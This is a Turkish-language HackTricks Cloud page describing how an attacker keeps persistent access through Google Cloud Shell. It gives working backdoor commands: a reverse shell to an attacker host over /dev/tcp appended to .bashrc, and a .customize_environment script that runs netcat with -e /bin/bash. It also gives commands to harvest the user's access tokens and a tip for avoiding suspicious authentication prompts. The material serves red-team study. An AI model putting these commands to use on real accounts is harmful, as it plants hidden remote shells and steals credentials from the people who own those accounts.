# GCP - Cloud Shell Kalıcılığı

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin!</summary>

HackTricks'i desteklemenin diğer yolları:

- Şirketinizin **HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
- [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
- [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
- 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'ı **takip edin**.
- **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)'a PR gönderin
*
*
*
* github depoları.

</details>

## Cloud Shell

Daha fazla bilgi için kontrol edin:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Kalıcı Arka Kapı

[**Google Cloud Shell**](https://cloud.google.com/shell/), tarayıcınızdan doğrudan bulut kaynaklarınıza komut satırı erişimi sağlar ve herhangi bir ek maliyet olmadan.

Google'ın Cloud Shell'ine **web konsolundan** veya **`gcloud cloud-shell ssh`** komutunu çalıştırarak erişebilirsiniz.

Bu konsol, saldırganlar için bazı ilginç yeteneklere sahiptir:

1. **Google Cloud'a erişimi olan herhangi bir Google kullanıcısı**, tam yetkilendirilmiş bir Cloud Shell örneğine erişebilir (Hizmet Hesapları, org'un Sahipleri bile olabilir).
2. Söz konusu örnek, **en az 120 gün boyunca ana dizinini koruyacaktır** eğer hiçbir etkinlik olmazsa.
3. Bu örneğin etkinliğini izlemek için **bir organizasyonun yetenekleri yoktur**.

Bu temelde, bir saldırgan kullanıcının ana dizinine bir arka kapı yerleştirebilir ve kullanıcı en az 120 günde bir GC Shell'e bağlandığı sürece arka kapı hayatta kalacak ve saldırgan her çalıştığında bir kabuk alacaktır sadece şunu yaparak:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Ev dizininde varsa her zaman **çalıştırılacak** olan **`.customize_environment`** adlı başka bir dosya bulunmaktadır. (Önceki teknikte olduğu gibi) Kullanıcı **bulut kabuğuna** eriştiğinde kalıcılığı sürdürmek için önceki arka kapıyı veya aşağıdakine benzer birini ekleyin:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
**Önemli not:** İlk kez kimlik doğrulaması gerektiren bir işlem gerçekleştirildiğinde, kullanıcının tarayıcısında bir kimlik doğrulama penceresi belirir. Bu pencerenin kabul edilmesi gerekmektedir. Beklenmeyen bir pencere belirirse, şüphe uyandırabilir ve kullanılan kalıcılık yöntemini tehlikeye atabilir.
{% endhint %}

Bu, bulut kabuğundan (`cloud shell`) (saldırgan olarak) `gcloud projects list` komutunu çalıştırdığınızda tarayıcının kullanıcı oturumunda görünen kimlik doğrulama penceresidir:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ancak, kullanıcı bulut kabuğunu aktif olarak kullandıysa, kimlik doğrulama penceresi belirmeyecek ve kullanıcının **token'larını toplayabilirsiniz**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSH bağlantısının nasıl kurulduğu

Temel olarak, bu 3 API çağrısı kullanılır:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (yerel olarak oluşturduğunuz genel anahtarını eklemenizi sağlar)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (örneği başlatmanızı sağlar)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (Google Cloud Shell'in IP'sini size söyler)

Ancak daha fazla bilgiyi [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key) adresinde bulabilirsiniz.

## Referanslar

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)
